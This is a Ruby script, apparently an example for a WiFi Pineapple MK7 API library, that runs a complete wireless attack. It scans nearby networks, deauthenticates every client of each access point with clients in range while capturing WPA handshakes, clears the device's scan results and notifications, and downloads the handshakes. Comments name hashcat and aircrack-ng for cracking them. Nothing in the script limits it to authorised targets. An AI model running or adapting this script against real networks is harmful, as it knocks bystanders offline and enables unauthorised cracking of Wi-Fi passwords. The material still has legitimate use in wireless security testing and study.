require_relative('../classes/PineappleMK7.rb')
include(PineappleMK7)

system = System.new()
system.host = "172.16.42.1"
system.port = "1471"
system.mac = "00:13:37:DD:EE:FF"
system.password = "P@55w0rD"

puts("[>] Authentication")
logged = system.login()

if (logged)

    pineAP = Modules::PineAP
    recon = Modules::Recon
    helpers = Modules::Helpers
    notifications = Modules::Notifications
    download = Modules::Download

    puts("[>] PineAP activation")
    pineAP.enable()

    puts("[>] Beginning of the discovery for 240 seconds")
    scan = recon.startScan(240)
    scanID = scan.scanID()

    puts("[>] Recovery of results")
    getResults = recon.getResults(scanID)
    
    puts("[@] Access Points with client(s)")
    apResults = (getResults.APResults().nil?() === false) ? getResults.APResults() : []
    apResults.each() do |ap|

        clients = ap.clients()

        if (clients.nil?() === false)

            puts("[+] SSID: " + ap.ssid())
            puts("[+] BSSID: " + ap.bssid())
            puts("[+] OUI: " + helpers.lookupOUI(ap.bssid()).vendor())
            puts("[+] Channel: " + ap.channel().to_s())
            puts("[+] Encryption: " + recon.convertEncryption(ap.encryption()))
            puts("[+] WPS: " + ap.wps().to_s())

            clientsMAC = []
            clients.each() do |client|
                puts("[++] Client: " + client.client_mac() + " - " + helpers.lookupOUI(client.client_mac()).vendor())
                clientsMAC << client.client_mac()
            end

            puts("[>>] Launching handshakes capture")
            pineAP.startHandshakesCapture(ap)

            puts("[>>] Deauthentication of client(s)")
            pineAP.deauthAP(ap.bssid(), ap.channel(), clientsMAC)
            sleep(60)

            puts("[>>] Stop capturing handshakes")
            pineAP.stopHandshakesCapture()
        
        else

            # pp(ap)

        end

    end

    puts("[@] Unassociated client(s)")
    unassociatedClientResults = (getResults.UnassociatedClientResults().nil?() === false) ? getResults.UnassociatedClientResults() : []
    unassociatedClientResults.each() do |unassociated|
        puts("Client MAC: " + unassociated.client_mac() + " -> (Access Point | Broadcast) MAC: " + unassociated.ap_mac() + " on channel " + unassociated.ap_channel().to_s())
    end

    puts("[@] Out-Of-Range client(s)")
    outOfRangeClientResults = (getResults.OutOfRangeClientResults().nil?() === false) ? getResults.OutOfRangeClientResults() : []
    outOfRangeClientResults.each() do |out|
        puts("Client MAC: " + out.client_mac() + " -> Access Point MAC: " + out.ap_mac() + " on channel " + out.ap_channel().to_s())
    end

    puts("[>] PineAP deactivation")
    pineAP.disable()

    puts("[>] Cleaning up the results")
    recon.deleteScan(scanID)

    puts("[>] Cleaning up notifications")
    notifications.clearAll()

    puts("[@] Captured/Downloaded WPA handshakes")
    handshakes = pineAP.getHandshakes().handshakes()
    if (handshakes.nil?() === false)

        handshakes.each() do |handshake|
            path = download.handshake(handshake.bssid(), handshake.type(), '../tmp/handshakes/')
            puts("[+] Handshake: " + handshake.bssid() + " / " + handshake.type() + " = " + path)
            # hcxpcaptool -> hashcat
            # aircrack-ng
        end

    end

end